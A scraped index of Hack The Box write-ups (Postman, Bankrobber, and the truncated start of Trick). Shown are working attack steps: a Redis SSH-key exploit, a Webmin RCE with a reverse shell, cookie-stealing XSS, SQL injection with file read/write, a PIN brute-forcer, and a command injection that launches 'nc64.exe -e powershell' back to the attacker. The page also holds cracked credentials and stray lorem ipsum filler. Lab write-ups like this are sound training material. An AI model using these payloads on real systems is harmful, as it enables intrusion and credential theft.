redis@postman.htb -i postman-id_rsa Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)\n* Documentation:  https://help.ubuntu.com\n* Management:     https://landscape.canonical.com\n* Support:        https://ubuntu.com/advantage\n\n\n* Canonical Livepatch is available for installation.\n  - Reduce system reboots and improve kernel security. Activate at:\n    https://ubuntu.com/livepatch\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\nLast login: Fri Nov 8 10:14:53 2019 from 10.10.14.39 redis@Postman:~$ id uid=107(redis) gid=114(redis) groups=114(redis)\n— AUTOMATICALLY — SYNTAX: python redis.py   root@p3:/opt/htb/machines/postman# python redis.py postman.htb redis *******************************************************************\n\n[+] [Exploit] Exploiting misconfigured REDIS SERVER*\n[+] AVINASH KUMAR THAPA aka “-Acid” *******************************************************************\n\nSSH Keys Need to be Generated Generating public/private rsa key pair. Enter file in which to save the key (/root/.ssh/id_rsa): /opt/htb/machines/postman/id_rsa Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /opt/htb/machines/postman/id_rsa. Your public key has been saved in /opt/htb/machines/postman/id_rsa.pub. The key fingerprint is: SHA256:3g7innFErBgyZ0Gyddm3m2KtlZ691TebaXAnProOcE8 acid_creative The key’s randomart image is: +—[RSA 3072]—-+ | ..+ .o | | + o… . | | + + o. . | | = o o . | | . . S..+E | | oo+o ..o.| | o.+=oo..+o+| | . =.oo…o.| | .+ ..=+.= | +—-[SHA256]—–+ Keys Generated Successfully OK OK OK (error) ERR Changing directory: Permission denied OK OK You’ll get shell in sometime..Thanks for your patience Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)\n* Documentation:  https://help.ubuntu.com\n* Management:     https://landscape.canonical.com\n* Support:        https://ubuntu.com/advantage\n\n\n* Canonical Livepatch is available for installation.\n  - Reduce system reboots and improve kernel security. Activate at:\n    https://ubuntu.com/livepatch\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\nLast login: Fri Nov 8 10:19:49 2019 from 10.10.14.10 redis@Postman:~$\nEnumerating the box as user ‘redis’ shows us that user.txt is in the /home/Matt/, unfortunatley we don’t have permissions. Snooping around further I found .bash_history in /var/lib/redis - within I can see commands to “id_rsa.bak”. Search to for file using find: redis@Postman:~$ find / -name “id_rsa*” /opt/id_rsa.bak\nLooking at the file we can see that it is a .pem-file with des3 encryption and salt 73E9CEFBCCF5287C. To crack it we need to convert it, do it using sshng2john. root@p3:/usr/share/john# ./sshng2john.py /opt/htb/machines/postman/id_rsa.bak &gt; /opt/htb/machines/postman/crack.txt root@p3:/opt/htb/machines/postman# john –wordlist=/usr/share/wordlists/rockyou.txt crack.txt Using default input encoding: UTF-8 Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes Cost 2 (iteration count) is 2 for all loaded hashes Will run 12 OpenMP threads Note: This format may emit false positives, so it will keep trying even after finding a possible candidate. Press ‘q’ or Ctrl-C to abort, almost any other key for status computer2008 (/opt/htb/machines/postman/id_rsa.bak) 1g 0:00:00:03 DONE (2019-11-08 13:14) 0.2666g/s 3824Kp/s 3824Kc/s 3824KC/s 0125457423 ..*7¡Vamos! Session completed\nWe now have the creds for what I assume is user Matt, trying to SSH with the private key and found password (computer2008) is not working however.\nroot@p3:/opt/htb/machines/postman# ssh matt@postman.htb -i id_rsa.bak Enter passphrase for key ‘id_rsa.bak’: computer2008 Connection closed by 10.10.10.160 port 22\nLooking at the sshd_config I noticed that user Matt is blocked for SSH. redis@Postman:~$ cat /etc/ssh/sshd_config # $OpenBSD: sshd_config,v 1.101 2017/03/14 07:19:07 djm Exp $ .. #deny users DenyUsers Matt ..\nEscalating from user redis to Matt internally however works just fine - grab user.txt redis@Postman:~$ su Matt Password: Matt@Postman:/var/lib/redis$ cat /home/Matt/user.txt 517a****************************\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nWith Matt’s creds (Matt:computer2008) we are now able to login to the webmin page - https://postman.htb:10000/ Googling for Webmin 1.910 exploit shows that there are a RCE exploit using Metasploit. Use this exploit to get root.txt\nNOTE: I you get “[-] Exploit aborted due to failure: unknown: Failed to retrieve session cookie” when trying to use the exploit it’s most likely a server-side error. Rebooting the box solved the error for me.\nmsf5 &gt; use exploit/linux/http/webmin_packageup_rce msf5 exploit(linux/http/webmin_packageup_rce) &gt; options\nModule options (exploit/linux/http/webmin_packageup_rce):\n\n\n\nName\nCurrent Setting\nRequired\nDescription\n\n\n\n\nPASSWORD\ncomputer2008\nyes\nWebmin Password\n\n\nProxies\n\nno\nA proxy chain of format type:host:port[,type:host:port][…]\n\n\nRHOSTS\npostman.htb\nyes\nThe target host(s), range CIDR identifier, or hosts file with syntax ‘file:’\n\n\nRPORT\n10000\nyes\nThe target port (TCP)\n\n\nSSL\ntrue\nno\nNegotiate SSL/TLS for outgoing connections\n\n\nTARGETURI\n/\nyes\nBase path for Webmin application\n\n\nUSERNAME\nMatt\nyes\nWebmin Username\n\n\nVHOST\n\nno\nHTTP server virtual host\n\n\n\nPayload options (cmd/unix/reverse_perl):\n\n\n\nName\nCurrent Setting\nRequired\nDescription\n\n\n\n\nLHOST\n10.10.14.10\nyes\nThe listen address (an interface may be specified)\n\n\nLPORT\n4444\nyes\nThe listen port\n\n\n\nExploit target:\n\n\n\nId\nName\n\n\n\n\n0\nWebmin &lt;= 1.910\n\n\n\nmsf5 exploit(linux/http/webmin_packageup_rce) &gt; run\n[*] Started reverse TCP handler on 10.10.14.10:4444 [+] Session cookie: 501d3e007ae09b5c7b9e1bcbc8009649 [*] Attempting to execute the payload… [*] Command shell session 1 opened (10.10.14.10:4444 -&gt; 10.10.10.160:40192) at 2019-11-08 15:08:01 +0100\nwhoami root cat /root/root.txt a257****************************\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nREDIS https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html"
  },
  {
    "objectID": "posts/2020-02-02-htb-writeup-bankrobber/2020-02-02-htb-writeup-bankrobber.html",
    "href": "posts/2020-02-02-htb-writeup-bankrobber/2020-02-02-htb-writeup-bankrobber.html",
    "title": "Bankrobber - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\nroot@p3:/opt/htb/machines/bankrobber# nmapAutomatorDirb.sh 10.10.10.154 All PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4) |_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4 |_http-title: E-coin 443/tcp open ssl/http Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4) |_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4 |_http-title: E-coin | ssl-cert: Subject: commonName=localhost | Not valid before: 2009-11-10T23:48:47 |_Not valid after: 2019-11-08T23:48:47 |ssl-date: TLS randomness does not represent time | tls-alpn: | http/1.1 445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) 3306/tcp open mysql MariaDB (unauthorized) Service Info: Host: BANKROBBER; OS: Windows; CPE: cpe:/o:microsoft:windows\n\n| http-enum: | /admin/: Possible admin folder | /admin/index.php: Possible admin folder | /Admin/: Possible admin folder | /css/: Potentially interesting directory w/ listing on ‘apache/2.4.39 (win64) openssl/1.1.1b php/7.3.4’ | /icons/: Potentially interesting folder w/ directory listing | /img/: Potentially interesting directory w/ listing on ‘apache/2.4.39 (win64) openssl/1.1.1b php/7.3.4’ | /js/: Potentially interesting directory w/ listing on ‘apache/2.4.39 (win64) openssl/1.1.1b php/7.3.4’ |_ /user/: Potentially interesting folder\nDIRB: + http://10.10.10.154:80/elements.html (CODE:200|SIZE:34812) + http://10.10.10.154:80/generic.html (CODE:200|SIZE:13343) + http://10.10.10.154:80/index.php (CODE:200|SIZE:8245) + http://10.10.10.154:80/Index.php (CODE:200|SIZE:8245) + http://10.10.10.154:80/link.php (CODE:200|SIZE:0) + http://10.10.10.154:80/login.php (CODE:302|SIZE:0) + http://10.10.10.154:80/Login.php (CODE:302|SIZE:0) + http://10.10.10.154:80/logout.php (CODE:302|SIZE:0) + http://10.10.10.154:80/register.php (CODE:200|SIZE:0)\nNIKTO: + /notes.txt: This might be interesting…\nSSLSCAN: SSL Certificate: Signature Algorithm: sha1WithRSAEncryption RSA Key Strength: 1024\nSubject: localhost Issuer: localhost\nNot valid before: Nov 10 23:48:47 2009 GMT Not valid after: Nov 8 23:48:47 2019 GMT\n\nHostname: Bankrobber\nSQL: MariaDB\nSSL Cert is Invalid, expired 2019-11-08.\nnotes.txt\n\nMove all files from the default Xampp folder: TODO\nEncode comments for every IP address except localhost: Done\nTake a break..\n\n\n\nThe site is vulnerable to XSS. Create an account and test to transfer E-coin. When transfering an admin must approve the transfer. The Comment field is vulnerable to XSS, we can get the admin cookie by tricking him to connect back to us.\nStart a nc session locally and then do the XSS.\nAmount: 1 ID Of Addressee: 1 Comment:\n\nroot@p3:/opt/htb/machines/bankrobber/10.10.10.154# nc -lvnp 80 listening on [any] 80 … connect to [10.10.14.12] from (UNKNOWN) [10.10.10.154] 49706 GET /bogus.php?output=username=YWRtaW4%3D;%20password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D;%20id=1 HTTP/1.1 Referer: http://localhost/admin/index.php User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1 Accept: / Connection: Keep-Alive Accept-Encoding: gzip, deflate Accept-Language: nl-NL,en,* Host: 10.10.14.12\nDecode the base64 encoded username and password\nroot@p3:/opt/htb/machines/bankrobber/10.10.10.154# echo YWRtaW4= | base64 -d admin root@p3:/opt/htb/machines/bankrobber/10.10.10.154# echo SG9wZWxlc3Nyb21hbnRpYw== | base64 -d Hopelessromantic\nCreds: admin:Hopelessromantic\nWe are now able to login as admin and get a few more options, backdoorchecker.php where we are allowed to execute ‘dir’ but only from local host. And search.php where we can query the database for users.\n“search.php/term=1” is injectable, we can enumerate the database manually or using sqlmap. For simplicity, i chose to go with the second option - sqlmap.\nroot@p3:/opt/htb/machines/bankrobber/10.10.10.154# sqlmap -u https://bankrobber.htb/admin/search.php –cookie=“id=1; username=YWRtaW4%3D; password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D” –data term=1 –current-user –current-db –passwords –tables .. database management system users password hashes: [*] pma [1]: password hash: NULL [*] root [1]: password hash: *F435725A173757E57BD36B09048B8B610FF4D0C4 .. [16:49:43] [INFO] fetching tables for databases: ‘bankrobber, information_schema, mysql, performance_schema, phpmyadmin, test’ Database: bankrobber [3 tables] +—————————————————-+ | balance | | hold | | users | +—————————————————-+\nroot@p3:/opt/htb/machines/bankrobber/10.10.10.154# sqlmap -u https://bankrobber.htb/admin/search.php –cookie=“id=1; username=YWRtaW4%3D; password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D” –data term=1 –search -D bankrobber -T users .. Database: bankrobber Table: users [4 entries] +—-+——————+———-+ | id | password | username | +—-+——————+———-+ | 1 | Hopelessromantic | admin | | 2 | gio | gio | | 3 | test123 | p3 | | 4 | test | test | +—-+——————+———-+\nWe find a second pair of credentials (gio:gio), and also a password hash for root (F435725A173757E57BD36B09048B8B610FF4D0C4)\nManual example in Burp: term=1’ UNION ALL SELECT 1,concat(id,0x3a,username,0x3a,password),3 FROM users;\n\n1:admin:Hopelessromantic\n\n &lt;td&gt;2:gio:gio&lt;/td&gt;\nCrack the password hash using hashcat, using rockyou.txt won’t give us the password - however using crackstation.net finds the password for us. I went ahead and added found password (Welkom1!) to rockyou.txt and ran hashcat again for poc.\nroot@p3:/opt/htb/machines/bankrobber# echo Welkom1! &gt;&gt; /usr/share/wordlists/rockyou.txt root@p3:/opt/htb/machines/bankrobber# hashcat -a0 -m300 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt Session……….: hashcat Status………..: Cracked Hash.Type……..: MySQL4.1/MySQL5 Hash.Target……: f435725a173757e57bd36b09048b8b610ff4d0c4 Time.Started…..: Mon Feb 3 17:09:03 2020 (1 sec) Time.Estimated…: Mon Feb 3 17:09:04 2020 (0 secs) Guess.Base…….: File (/usr/share/wordlists/rockyou.txt) Guess.Queue……: 1/1 (100.00%) Speed.#1………: 15110.2 kH/s (3.15ms) @ Accel:1024 Loops:1 Thr:64 Vec:1 Recovered……..: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress………: 14344387/14344387 (100.00%) Rejected………: 0/14344387 (0.00%) Restore.Point….: 14155776/14344387 (98.69%) Restore.Sub.#1…: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#1….: 0213JR -&gt; Welkom1! Hardware.Mon.#1..: Temp: 56c Util: 33% Core:1770MHz Mem:6000MHz Bus:16\nStarted: Mon Feb 3 17:08:59 2020 Stopped: Mon Feb 3 17:09:04 2020\nroot@p3:/opt/htb/machines/bankrobber# cat cracked.txt f435725a173757e57bd36b09048b8b610ff4d0c4:Welkom1!\nNOTE: root:Welkom1! (MariaDB - MySQL) NOTE: admin:Hopelessromantic (WebApp) NOTE: gio:gio (WebApp)\nWe are unable to login anywhere with the found creds, so we continue to enumerate the box using the SQLi vuln. File Read and Write is possible, we can use this to get a webshell and/or enumerate interesting files such as backdoorchecker.php.\nPOST /admin/search.php HTTP/1.1 Host: bankrobber.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: / Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://bankrobber.htb/admin/ Content-type: application/x-www-form-urlencoded Content-Length: 69 Connection: close Cookie: id=1; username=YWRtaW4%3D; password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D\nFile Read: term=1’ UNION ALL SELECT 1,LOAD_FILE(’C:/xampp/htdocs/admin/backdoorchecker.php),3;–\nFile Write: term=1’ UNION ALL SELECT 1,‘this is the content of my test-file’,3 into outfile ‘C:/xampp/test.txt’;– term=1’ UNION ALL SELECT 1,load_file(‘C:/xampp/test.txt’),3;–\nBackdoorchecker.php is secured in two way; First - Can only execute the command “dir”, however it doesn’t cancel the escape characters ; | etc. Second - Commands can only be ran from ::1\nThe Second part is a issue, no matter how much we tamper with the HTTP Header (X-Forwarded-From etc.) it wont work. We need to find a way to get past this issue, and luckily there are two options - the hard way and the easy way.\nHard - Create a javascript file to send a POST request to backdoorchecker.php with desired command in the “cmd” variable, and call it using the XSS vulnerability that gave us the admin cookie. Example:  invisible iframe\nEasy - When logged in as admin, enumerating the site we find a javascript file called system.js. Within there’s a function, callSys, used to trigger the commands towards backdoorchecker.php. We can call this script and function as a new user, from the comment filed (where we previously executed our XSS to get admin cookie) to get RCE. Example:\n       &lt;script type=\"text/javascript\"&gt;callSys('dir|ping 10.10.14.12');&lt;/script&gt;\n\n       root@p3:/opt/htb/machines/bankrobber# tcpdump -i tun0 icmp\n         tcpdump: verbose output suppressed, use -v or -vv for full protocol decode\n         listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes\n         11:58:13.611598 IP bankrobber.htb &gt; p3: ICMP echo request, id 1, seq 5, length 40\n         11:58:13.611631 IP p3 &gt; bankrobber.htb: ICMP echo reply, id 1, seq 5, length 40\nUse the RCE to trigger a reverse shell and grab user.txt\nCraft the payload: root@p3:/opt/htb/machines/bankrobber# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.12 LPORT=4488 -f exe &gt; br-rev.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder or badchars specified, outputting raw payload Payload size: 341 bytes Final size of exe file: 73802 bytes\nTrigger the payload/reverse shell from the comments field:\n\nCapture the shell, and grab user.txt: msf5 exploit(multi/handler) &gt; run [*] Started reverse TCP handler on 10.10.14.12:4488 [*] Sending stage (180291 bytes) to 10.10.10.154 [*] Meterpreter session 1 opened (10.10.14.12:4488 -&gt; 10.10.10.154:56865) at 2020-02-05 13:05:25 +0100\nmeterpreter &gt; sysinfo Computer : BANKROBBER OS : Windows 10 (10.0 Build 14393). Architecture : x64 System Language : nl_NL Domain : WORKGROUP Logged On Users : 3 Meterpreter : x86/windows\nmeterpreter &gt; shell Process 4552 created. Channel 1 created. Microsoft Windows [Version 10.0.14393]\n\n2016 Microsoft Corporation. Alle rechten voorbehouden.\n\nC:&gt;whoami bankrobber C:&gt;type user.txt f635346600876a43441cf1c6e94769ac\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nEnumerate the box to try to find a way towards root. We find the executable bankv2.exe running on port 910. We are unable to download the file, so instead we setup a port forward to access it locally.\n\nmeterpreter &gt; netstat Connection list =============== Proto Local address Remote address State User Inode PID/Program name —– ————- ————– —– —- —– —————- tcp 0.0.0.0:135 0.0.0.0:* LISTEN 0 0 732/svchost.exe tcp 0.0.0.0:910 0.0.0.0:* LISTEN 0 0 2160/bankv2.exe\nmeterpreter &gt; ls Listing: C:\n============\n\n\n\nMode\nSize\nType\nLast modified\nName\n\n\n\n\n100777/rwxrwxrwx\n57937\nfil\n2019-04-25 01:10:31 +0200\nbankv2.exe\n\n\n\nmeterpreter &gt; download bankv2.exe [*] Downloading: bankv2.exe -&gt; bankv2.exe [-] core_channel_open: Operation failed: Access is denied.\n\nWe can’t download and investigate the file, so instead we setup portforwarding to reach the service locally.\nmeterpreter &gt; portfwd add -l 910 -p 910 -r 10.10.10.154 [*] Local TCP relay created: :910 &lt;-&gt; 10.10.10.154:910\nroot@p3:/opt/htb/machines/bankrobber# telnet 127.0.0.1 910 Trying 127.0.0.1… Connected to 127.0.0.1. Escape character is ‘^]’. ————————————————————– Internet E-Coin Transfer System International Bank of Sun church v0.1 by Gio & Cneeliz ————————————————————– Please enter your super secret 4 digit PIN code to login: [$] 1111 [!] Access denied, disconnecting client….\nInstead of enumerating the PIN Code manually we write a simple python brute force script. After a lot of trial and error, the is the script I came up with that gave the correct PIN:\nimport telnetlib from time import sleep\ndef main(): host = ‘localhost’ port = 910 for i in range(0000,9999): connection = telnetlib.Telnet(host,port) response = connection.read_until(‘[$]’) print response pin = format(i,‘04d’) commandstr = pin + ‘’ print ’ Trying PIN: ’ + commandstr connection.write(commandstr) sleep(2) response_str = connection.read_until(‘’) if(“[!] Access denied, disconnecting client….” in response_str): print ” Wrong PIN, trying next one!” continue else: print ” PIN Found!” print response_str print ” ### Final PIN: ” + format(i,‘04d’) + ” ###” break return\nif name == ‘main’: main()\n\n\n\not@p3:/opt/htb/machines/bankrobber# brute-pin.py\n\n\n\n\nInternet E-Coin Transfer System\n\n\nInternational Bank of Sun church\n\n\nv0.1 by Gio & Cneeliz\n\n\n\nPlease enter your super secret 4 digit PIN code to login: [$] Trying PIN: 0021\nGot response. [$] PIN is correct, access granted!\n### Correct PIN: 0021 ###\nWe found the PIN, however manually executing telnet and entering the PIN still gives us ‘[!] Access denied’. Continue to enumerate the service and what happens after we enter correct PIN by capturing and printing all the responses. Doing so we find that a second type of input is needed - transfer amount.\n.. [$] PIN is correct, access granted!\n\n\n\n### Correct PIN: 0021 ###\n\n\n\n\nPlease enter the amount of e-coins you would like to transfer:\n\n\n[$] ………\n\n\n[!] You waited too long, disconnecting client….\n\n\n\nWe create a new script to capture the second input parameter (starting with ‘[$]’ again) and try to send some data. We start by trying to execute a simple ping, doing so gives us the following response:\n\n\n\n[$] PIN is correct, access granted!\n\n\n\n\nPlease enter the amount of e-coins you would like to transfer:\n\n\n[$]\n\n\nExecuting RCE: |cmd.exe /c “ping 10.10.14.21”\n\n\n[$] Transfering $|cmd.exe /c “ping 10.10.14.21” using our e-coin transfer application.\n\n\n[$] Executing e-coin transfer tool: C:.exe\n\n\n\n[$] Transaction in progress, you can safely disconnect…\nThis doesn’t really give us anything. I try again but this time flood the input by sending ‘9999999999999999999999999999999999999999999999999’ and we get an interesting response:\n\n\n\n[$] PIN is correct, access granted!\n\n\n\n\nPlease enter the amount of e-coins you would like to transfer:\n\n\n[$]\n\n\nExecuting RCE: 9999999999999999999999999999999999999999999999999\n\n\n[$] Transfering $9999999999999999999999999999999999999999999999999 using our e-coin transfer application.\n\n\n[$] Executing e-coin transfer tool: 99999999999999999\n\n\n\n[$] Transaction in progress, you can safely disconnect…\nThe executing row changed, now instead of executing transfer.exe it will try to execute ‘99999999999999999’. Notice that we lost a lot of 9’s from our input compared to the output.\nroot@p3:/opt/htb/machines/bankrobber# echo 99999999999999999 | wc -c 18 root@p3:/opt/htb/machines/bankrobber# echo 9999999999999999999999999999999999999999999999999 | wc -c 50\nThere seems to be a max limit of characters, so lets try to modify our script to add a padding of characters before our RCE.\n\n\n\n[$] PIN is correct, access granted!\n\n\n\n\nPlease enter the amount of e-coins you would like to transfer:\n\n\n[$]\n\n\nExecuting RCE: 99999999999999999999999999999999cmd.exe /c “ping 10.10.14.21”\n\n\n[$] Transfering $99999999999999999999999999999999cmd.exe /c “ping 10.10.14.21” using our e-coin transfer application.\n\n\n[$] Executing e-coin transfer tool: cmd.exe /c “ping 10.10.14.21”\n\n\n\n[$] Transaction in progress, you can safely disconnect…\nroot@p3:/opt/htb/machines/bankrobber# tcpdump -i tun0 icmp tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes 10:43:55.390230 IP bankrobber.htb &gt; p3: ICMP echo request, id 1, seq 13, length 40 10:43:55.390271 IP p3 &gt; bankrobber.htb: ICMP echo reply, id 1, seq 13, length 40 10:43:56.397467 IP bankrobber.htb &gt; p3: ICMP echo request, id 1, seq 14, length 40 10:43:56.397506 IP p3 &gt; bankrobber.htb: ICMP echo reply, id 1, seq 14, length 40 10:43:57.412784 IP bankrobber.htb &gt; p3: ICMP echo request, id 1, seq 15, length 40 10:43:57.412822 IP p3 &gt; bankrobber.htb: ICMP echo reply, id 1, seq 15, length 40 10:43:58.428235 IP bankrobber.htb &gt; p3: ICMP echo request, id 1, seq 16, length 40 10:43:58.428256 IP p3 &gt; bankrobber.htb: ICMP echo reply, id 1, seq 16, length 40\nWe got code execution!\nUse the RCE to gain a reverse shell as admin, and grab root.txt.\n\n\n\noot@p3:/opt/htb/machines/bankrobber# python privesc.py\n\n\n\n\nInternet E-Coin Transfer System\n\n\nInternational Bank of Sun church\n\n\nv0.1 by Gio & Cneeliz\n\n\n\nPlease enter your super secret 4 digit PIN code to login: [$] Entering: 0021\nPIN Correct! [$] PIN is correct, access granted!\n\nPlease enter the amount of e-coins you would like to transfer: [$] Executing RCE: //10.10.14.21/pub-share/nc64.exe 10.10.14.21 4499 -e powershell\n###################################### ### ### ### RCE Complete - Happy Hacking ### ### ### ######################################\nroot@p3:/opt/htb/machines/bankrobber# nc -lvnp 4499 listening on [any] 4499 … connect to [10.10.14.21] from (UNKNOWN) [10.10.10.154] 50702 Windows PowerShell Copyright (C) 2016 Microsoft Corporation. All rights reserved.\nPS C:&gt; whoami nt authority PS C:&gt; type root.txt aa65d8e6216585ea636eb07d4a59b197\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nXSS https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#javascript-keylogger https://www.ivoidwarranties.tech/posts/pentesting-tuts/website-pentesting/xss/ https://stackoverflow.com/questions/1045845/how-to-call-a-javascript-function-from-php\nSQLi https://medium.com/@Kan1shka9/pentesterlab-from-sql-injection-to-shell-walkthrough-7b70cd540bc8 https://medium.com/bugbountywriteup/sql-injection-with-load-file-and-into-outfile-c62f7d92c4e2 http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet\nJS POST Request: https://stackoverflow.com/questions/692196/post-request-javascript\nXML HTTP: https://www.w3schools.com/xml/xml_http.asp https://www.w3schools.com/xml/ajax_xmlhttprequest_response.asp\nPython Script: https://docs.python.org/release/2.5.2/lib/typesseq-strings.html https://blog.anshumanonline.com/bandit25/ ```"
  },
  {
    "objectID": "posts/2022-06-20-htb-writeup-trick/2022-06-20-htb-writeup-trick.html",
    "href": "posts/2022-06-20-htb-writeup-trick/2022-06-20-htb-writeup-trick.html",
    "title": "Trick - Hack The Box",
    "section": "",
    "text": "USER\n\nStep 1\nnmap:\n➜  trick nmap -Pn -n -p- -v 10.129.37.48\nPORT   STATE SERVICE\n22/tcp open  ssh\n25/tcp open  smtp\n53/tcp open  domain\n80/tcp open  http\n\n➜  trick nmap -Pn -n 10.129.37.48 -sCV -p22,25,53,80   \nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey: \n|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)\n|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)\n|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)\n25/tcp open  smtp?\n|_smtp-commands: Couldnt establish connection on port 25\n53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)\n| dns-nsid: \n|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian\n80/tcp open  http    nginx 1.14.2\n|_http-title: Coming Soon - Start Bootstrap Theme\n|_http-server-header: nginx/1.14.2\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n\n➜  trick sudo nmap -sU -v 10.129.37.48 -Pn --top-port=100\nPORT     STATE         SERVICE\n53/udp   open          domain\n68/udp   open|filtered dhcpc\n631/udp  open|filtered ipp\n5353/udp open|filtered zeroconf\nzone transfer:\n➜  trick host -t axfr trick.htb 10.129.37.48\nTrying \"trick.htb\"\nUsing domain server:\nName: 10.129.37.48\nAddress: 10.129.37.48#53\nAliases: \n\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 33770\n;; flags: qr aa; QUERY: 1, ANSWER: 6, AUTHORITY: 0, ADDITIONAL: 0\n\n;; QUESTION SECTION:\n;trick.htb.         IN  AXFR\n\n;; ANSWER SECTION:\ntrick.htb.      604800  IN  SOA trick.htb. root.trick.htb. 5 604800 86400 2419200 604800\ntrick.htb.      604800  IN  NS  trick.htb.\ntrick.htb.      604800  IN  A   